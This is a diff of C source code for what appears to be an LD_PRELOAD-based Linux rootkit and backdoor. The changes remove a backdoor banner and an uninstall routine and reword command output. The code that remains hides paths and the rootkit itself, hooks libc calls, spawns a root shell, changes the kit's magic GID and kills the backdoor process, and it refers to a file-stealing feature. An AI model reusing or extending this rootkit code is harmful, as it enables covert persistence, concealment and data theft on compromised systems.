@@ -1,20 +1,5 @@
-#ifdef BACKDOOR_ROLF
-void dorolfpls(void){
-    printf("\033[0;31m");
-    for(int i = 0; i != BDANSI_SIZE; i++)
-        printf("%c", bdansi[i]);
-    printf("\033[0m\n");
-
-    size_t rolfsize = sizeofarr(rolfs);
-    srand(time(NULL));
-    char *randrolf = rolfs[rand() % rolfsize];
-    printf("\e[31m%s\e[0m\n", randrolf);
-    exit(0);
-}
-#endif
-
 void option_err(char *a0){
-    printf("valid commands:\n");
+    printf("\e[1;31mValid commands:\e[0m\n");
     printf("\t%s hide/unhide <path>\n", a0);
     printf("\t%s uninstall\n", a0);
     printf("\t%s unhideself\n", a0);
@@ -36,63 +21,12 @@ void option_err(char *a0){
     exit(0);
 }
 
-void eradicatedir(const char *target){
-    DIR *dp;
-    struct dirent *dir;
-    size_t pathlen;
-
-    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR);
-
-    dp = call(COPENDIR, target);
-    if(dp == NULL) return;
-
-    while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
-            continue;
-
-        pathlen = strlen(target) + strlen(dir->d_name) + 2;
-        if(pathlen>PATH_MAX) continue;
-
-        char path[pathlen];
-        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
-
-        if((long)call(CUNLINK, path) < 0)
-            printf("failed unlink on %s\n", path);
-    }
-    closedir(dp);
-    if((long)call(CRMDIR, target) < 0)
-        printf("failed rmdir on %s\n", target);
-}
-
-void uninstallbdv(void){
-    eradicatedir(INSTALL_DIR);
-    eradicatedir(HOMEDIR);
-#ifdef FILE_STEAL
-    eradicatedir(INTEREST_DIR);
-#endif
-
-    hook(CUNLINK);
-    if((long)call(CUNLINK, PRELOAD_FILE) < 0)
-        printf("failed removing preload file (%s)\n", PRELOAD_FILE);
-
-    char *src, *dest;
-    for(int i = 0; i != LINKSRCS_SIZE; i++){
-        src = linksrcs[i];
-        dest = linkdests[i];
-
-        if((long)call(CUNLINK, src) < 0 && errno != ENOENT)
-            printf("failed removing %s (%s)\n", src, basename(dest));
-    }
-}
-
 void do_self(void){
-    /* we need some kind of warning message. this will do for now. */
-    printf("unhiding self...\n");
-
+    printf("Unhiding self...\n");
     chdir("/");
     unhide_self();
     system("id");
-    printf("you're now totally visible. 'exit' when you want to return to being hidden.\n");
+    printf("You're now totally visible. 'exit' when you want to return to being hidden.\n");
 
     char *args[3];
     args[0] = "/bin/sh";
@@ -116,26 +50,31 @@ void do_self(void){
 void symlinkstuff(void){
     hook(CACCESS, CSYMLINK);
 
-    char *src, *dest;
-    int ok=0, fail=0;
+    char *src, *dest, *linkname;
+    int ok=0, fail=0, acc, syml;
     for(int i = 0; i != LINKSRCS_SIZE; i++){
         src = linksrcs[i];
         dest = linkdests[i];
+        linkname = basename(dest);
 
-        if((long)call(CACCESS, src, F_OK) == 0){
-            if((long)call(CSYMLINK, src, dest) < 0){
-                if(errno != EEXIST)
-                    fail++;
-                else
-                    ok++; // assume thats ok
-            }else ok++;
+        acc = (long)call(CACCESS, src, F_OK);
+        if(acc < 0){
+            printf("Something went wrong trying to access %s (\e[31m%s\e[0m)\n", src, linkname);
+            fail++;
+            continue;
         }
+
+        syml = (long)call(CSYMLINK, src, dest);
+        if(syml < 0 && errno == EEXIST){
+            printf("Link \e[31m%s\e[0m already exists... It \e[1mreally\e[0m shouldn't.\n", linkname);
+            continue;
+        }else if(syml < 0){
+            printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
+            fail++;
+        }else ok++;
     }
 
-    printf("Links successful: \e[31m%d\e[0m/%d\n", ok, LINKSRCS_SIZE);
-    if(fail > 0)
-        printf("Failed links: \e[31m%d\e[0m)\n", fail);
-
+    if(fail > 0) printf("Failed links: \e[31m%d\e[0m\n", fail);
     exit(0);
 }
 
@@ -175,15 +114,13 @@ void dobdvutil(char *const argv[]){
 #ifdef READ_GID_FROM_FILE
     if(!strcmp("changegid", option)){
         gid_t newgid;
-
-        printf("current magic GID: %d\n", readgid());
-        printf("you are about to change the rootkit's GID.\n");
-        printf("this backdoor process will be killed & you'll have to reconnect.\n");
-        printf("press enter if you really wanna do this.");
+        printf("Changing kit GID.\n");
+        printf("Current GID: %d\n", readgid());
+        printf("Press enter to continue.");
         getchar();
         
         newgid = changerkgid();
-        printf("new magic GID: %d\n", newgid);
+        printf("New GID: %d\n", newgid);
 
         hook(CKILL);
         call(CKILL, getppid(), SIGKILL);
